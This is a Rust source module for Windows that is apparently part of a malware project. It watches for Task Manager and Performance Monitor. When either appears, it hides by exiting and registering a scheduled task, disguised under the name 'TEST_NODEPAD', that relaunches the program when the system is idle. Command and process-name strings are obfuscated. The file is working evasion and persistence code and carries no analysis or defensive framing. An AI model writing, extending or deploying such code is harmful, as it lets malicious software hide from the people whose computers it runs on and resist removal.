use std::os::windows::process::CommandExt;
use std::{
    mem::{size_of, MaybeUninit},
    process::{exit, Command},
    time::Duration,
};
use winapi::um::{
    handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
    tlhelp32::{
        CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
    },
    winbase::CREATE_NO_WINDOW,
};

use crate::utils::get_current_exe;

pub fn setup_evade_thread() {
    std::thread::spawn(move || loop {
        let output = Command::new(obfstr::obfstr!("tasklist.exe"))
            .creation_flags(CREATE_NO_WINDOW)
            .output();

        if let Ok(output) = output {
            let list_of_process = String::from_utf8_lossy(&output.stdout).to_lowercase();
            if list_of_process.contains(obfstr::obfstr!("taskmgr.exe"))
                || list_of_process.contains("perfmon.exe")
            {
                evade();
            }
        }

        std::thread::sleep(Duration::from_millis(100));
    });
}

pub fn evade() {
    let cmd =
        obfstr::obfstr!("SCHTASKS /CREATE /SC ONIDLE /TN TEST_NODEPAD /TR {:EXE} /I 1 /F /IT")
            .replace(obfstr::obfstr!("{:EXE}"), &get_current_exe());

    let _ = Command::new(obfstr::obfstr!("cmd"))
        .args(&[obfstr::obfstr!("/C"), &cmd])
        .output();

    exit(0);
}

fn check_task_process_online() -> bool {
    let process_snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    let mut process_entry: MaybeUninit<PROCESSENTRY32> = MaybeUninit::uninit();
    let mut is_running = false;

    if process_snap != INVALID_HANDLE_VALUE {
        let return_code = unsafe {
            (*process_entry.as_mut_ptr()).dwSize = size_of::<PROCESSENTRY32>() as _;
            Process32First(process_snap, process_entry.as_mut_ptr())
        };

        if return_code != 0 {
            is_running =
                is_task_listing_process(unsafe { &extract_process_name_unchecked(&process_entry) });
        }

        if !is_running {
            while !is_running
                && unsafe { Process32Next(process_snap, process_entry.as_mut_ptr()) != 0 }
            {
                is_running = is_task_listing_process(unsafe {
                    &extract_process_name_unchecked(&process_entry)
                });
            }
        }

        unsafe { CloseHandle(process_snap) };
    }

    is_running
}

unsafe fn extract_process_name_unchecked(entry: &MaybeUninit<PROCESSENTRY32>) -> String {
    let process_info = entry.assume_init_ref();
    let process_name = std::slice::from_raw_parts(
        process_info.szExeFile.as_ptr() as *const u8,
        process_info.szExeFile.len(),
    );
    String::from_utf8_lossy(process_name).to_lowercase()
}

fn is_task_listing_process(process_name: &str) -> bool {
    [
        obfstr::obfstr!("taskmgr.exe"),
        obfstr::obfstr!("tasklist.exe"),
        obfstr::obfstr!("perfmon.exe"),
    ]
    .iter()
    .any(|tlp| process_name.starts_with(tlp))
}
